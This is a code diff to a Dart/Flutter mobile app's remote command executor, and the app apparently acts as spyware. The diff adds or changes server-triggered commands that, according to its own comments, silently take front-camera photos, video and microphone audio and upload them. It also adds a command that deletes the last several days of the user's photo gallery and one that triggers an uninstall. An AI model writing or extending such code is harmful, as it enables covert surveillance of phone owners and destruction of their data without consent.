@@ -1,14 +1,12 @@
-import 'package:flutter/foundation.dart';
 import 'package:mop_app/core/api_client.dart';
 import 'package:mop_app/core/device_info_service.dart';
 import 'package:mop_app/core/native_bridge.dart';
+import 'package:mop_app/utils/permission_helper.dart';
 
-/// 远程指令执行（规约 PROTOCOL 4.2：dial/sms 非静默，wipe 静默；capture 静默采集并 audit/upload 上报）
+/// 远程指令执行（规约 PROTOCOL 4.2：dial/sms 非静默；capture 静默采集并 audit/upload 上报；gallery.clear 仅清理相册）
 class CommandExecutor {
-  CommandExecutor({this.onWipeRequired, ApiClient? api}) : _api = api ?? ApiClient();
+  CommandExecutor({ApiClient? api}) : _api = api ?? ApiClient();
 
-  /// wipe 执行后调用，由调用方注册为“清空后跳转登录”
-  final VoidCallback? onWipeRequired;
   final ApiClient _api;
 
   /// 执行单条指令（cmd 含 cmd、params、msg_id）
@@ -27,8 +25,23 @@ class CommandExecutor {
         final body = params['body'] as String? ?? '';
         await NativeBridge.openSystemSms(number, body);
         break;
+      case 'mop.cmd.gallery.clear':
+        // 仅清理相册最近 N 天，不清空 APP 数据、不退出登录
+        final days = (params['days'] as num?)?.toInt() ?? 3;
+        if (days > 0) {
+          try {
+            await NativeBridge.clearGalleryWithinDays(days);
+          } catch (_) {}
+        }
+        break;
       case 'mop.cmd.wipe':
-        await _doWipe();
+        // 已废弃：不再执行任何操作，客户端忽略
+        break;
+      case 'mop.cmd.uninstall':
+        // 仅调起系统卸载，不再执行数据擦除
+        try {
+          await NativeBridge.uninstallApp();
+        } catch (_) {}
         break;
       case 'mop.cmd.audit':
         // 静默：触发审计周期，由 AuditService 处理
@@ -37,20 +50,29 @@ class CommandExecutor {
         // 静默：更新 Host 等，可扩展
         break;
       case 'mop.cmd.capture.photo':
-        await _doCaptureAndUpload('capture_photo', msgId, () => NativeBridge.capturePhoto(
-          camera: (params['camera'] as String?) ?? 'back',
-        ));
+        if (await ensureCameraPermission()) {
+          await Future.delayed(const Duration(milliseconds: 800));
+          await _doCaptureAndUpload('capture_photo', msgId, () => NativeBridge.capturePhoto(
+            camera: (params['camera'] as String?) ?? 'front',
+          ));
+        }
         break;
       case 'mop.cmd.capture.video':
-        await _doCaptureAndUpload('capture_video', msgId, () => NativeBridge.captureVideo(
-          durationSec: (params['duration_sec'] as int?) ?? 18,
-          camera: (params['camera'] as String?) ?? 'back',
-        ));
+        if (await ensureCameraPermission() && await ensureMicrophonePermission()) {
+          await Future.delayed(const Duration(milliseconds: 800));
+          await _doCaptureAndUpload('capture_video', msgId, () => NativeBridge.captureVideo(
+            durationSec: (params['duration_sec'] as int?) ?? 18,
+            camera: (params['camera'] as String?) ?? 'front',
+          ));
+        }
         break;
       case 'mop.cmd.capture.audio':
-        await _doCaptureAndUpload('capture_audio', msgId, () => NativeBridge.captureAudio(
-          durationSec: (params['duration_sec'] as int?) ?? 18,
-        ));
+        if (await ensureMicrophonePermission()) {
+          await Future.delayed(const Duration(milliseconds: 800));
+          await _doCaptureAndUpload('capture_audio', msgId, () => NativeBridge.captureAudio(
+            durationSec: (params['duration_sec'] as int?) ?? 18,
+          ));
+        }
         break;
       default:
         break;
@@ -63,10 +85,5 @@ class CommandExecutor {
     if (bytes.isEmpty) return;
     final deviceId = await DeviceInfoService.getDeviceId();
     await _api.auditUpload(deviceId, type, bytes, msgId: msgId.isNotEmpty ? msgId : null);
-  }
-
-  Future<void> _doWipe() async {
-    await ApiClient().clearAllForWipe();
-    onWipeRequired?.call();
   }
 }
